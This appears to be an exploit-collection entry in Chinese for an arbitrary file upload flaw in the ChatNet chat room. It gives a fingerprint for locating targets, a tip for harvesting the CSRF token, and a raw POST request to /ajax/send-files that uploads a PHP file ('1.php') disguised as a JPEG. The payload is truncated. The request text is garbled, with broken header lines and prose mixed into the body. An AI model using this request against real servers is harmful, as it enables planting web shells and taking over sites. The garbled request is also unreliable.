# ChatNet聊天室send-file任意⽂件上传漏洞

- **系统**：ChatNet　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/static/vendor/toastr/toastr.min.css"`
- **请求**：`POST /ajax/send-files HTTP/1.1`

**请求体 / payload**
```
的CSRF Token 在⽹站⾸⻚就能获取到，直接Ctrl+U 查看⽹站源码，然后搜索Token 即可获取到
Host:
KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywTK0blfV
OgFIlHoB
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: PHPSESSID=d8abovre4i5vekn4kqa6o3fhpg;
Content-Length: 339
------WebKitFormBoundarywTK0blfVOgFIlHoB
Content-Disposition: form-data; name="csrftoken"
I/L/UQ88VVaVOdp8LAqhv/Au0s3Bpb3jMb9/xYCzCmg=
------WebKitFormBoundarywTK0blfVOgFIlHoB
Content-Disposition: form-data; name="file[]"; filename="1.php"
Content-Type: image/jpeg
<?ph…（脚本共 701 字，完整版见原文）
```
- **预期**：200　|　—